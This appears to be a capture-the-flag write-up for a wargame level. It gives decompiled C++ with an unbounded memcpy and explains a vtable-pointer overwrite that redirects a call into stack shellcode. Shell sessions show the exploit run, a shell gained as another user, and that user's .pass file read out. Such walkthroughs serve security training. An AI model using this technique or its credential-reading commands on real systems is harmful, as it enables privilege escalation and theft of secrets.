@@ -1,0 +1,94 @@
+## Level 9
+
+level9:c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+main:
+```
+int     main(int ac,char **av)
+{
+        N *obj1;
+        N *obj2;
+        ulong retval;
+  
+        if (ac < 2) {
+                    /* WARNING: Subroutine does not return */
+                _exit(1);
+        }
+        obj1 = (N *)operator.new(108);
+        N::constructor(obj1,5);
+        obj2 = (N *)operator.new(108);
+        N::constructor(obj2,6);
+        N::setAnnotation(obj1,av[1]);
+        retval = (*obj2->vptr->operator+)(obj2,obj1);
+        return retval;
+}
+```
+
+class N:
+```
+class N {
+  public:
+        nvtable     *vptr;
+        char        str[100];
+        int         nbr;
+
+        N(N* this, int val);
+        void    setAnnotation(N *this, char *arg);
+        int     operator+(N *this, N *arg);
+        int     operator-(N *this, N *arg);
+};
+```
+
+class N's parameterized constructor:
+```
+N::N(N *this, int val)
+{
+        this->vptr = (N_Vtable *)&PTR_operator+_08048848;
+        this->nbr = val;
+        return;
+}
+```
+
+N::setAnnotation, N's member function:
+```
+void N::setAnnotation(N *this, char *arg)
+{
+        size_t __n;
+  
+        __n = strlen(arg);
+        memcpy(this->str, arg, __n);
+        return;
+}
+```
+
+two operator overloads:
+```
+int    N::operator+(N *this, N *arg)
+{
+        return arg->nbr + this->nbr;
+}
+
+int    N::operator-(N *this ,N *arg)
+
+{
+        return this->nbr - arg->nbr;
+}
+```
+
+A buffer overflow vulnerability resides in `N::setAnnotation` because it doesn't force a buffer size instead it relies on the argument's length. we can exploit this through overwriting the vtable pointer of the class that is used to reference `operator+` so instead of calling it, it will call something else, in our case we'll make it jump to the shellcode in the stack.
+
+```
+$ ./level9 $(python /tmp/shellcode9.py)
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
+```
+~$ env -i ./level9 $(/tmp/ex.sh "\x7c\xff\xff\xbf")
+$ id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
